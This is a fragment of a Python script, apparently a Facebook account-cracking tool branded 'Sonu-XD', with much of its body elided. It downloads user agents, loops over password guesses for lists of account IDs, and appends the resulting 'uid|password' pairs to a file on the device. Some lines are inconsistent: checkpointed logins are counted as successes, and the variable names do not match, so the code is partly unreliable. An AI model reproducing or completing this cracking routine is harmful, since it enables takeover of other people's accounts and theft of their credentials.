...
try:
	...
	os.system('git clone https://github.com/SONU-XD/ua')
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mSonu-XD')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/SONU-XD/ua/blob/main/sonu-ua.txt').text
		ua=open('.ua.txt','w')
...
def menu():
	...
	if SAWROJ in ['1']:
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100084892471889&mibextid=ZbWKwL')
	elif SAWROJ in ['3','03']:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100084892471889&mibextid=ZbWKwL')
	elif SAWROJ in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [Sonu-XD] {P}{loop}{P}/{P}{len(id)}{P} OK{P}={H}{ok}{P} CP{P}={P}{cp}{x} {P}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H} [SXS-OK] {idf}  {pw}')
				open('/sdcard/SXS-OK.txt','a').write(uid+'|'+pas+'\n')
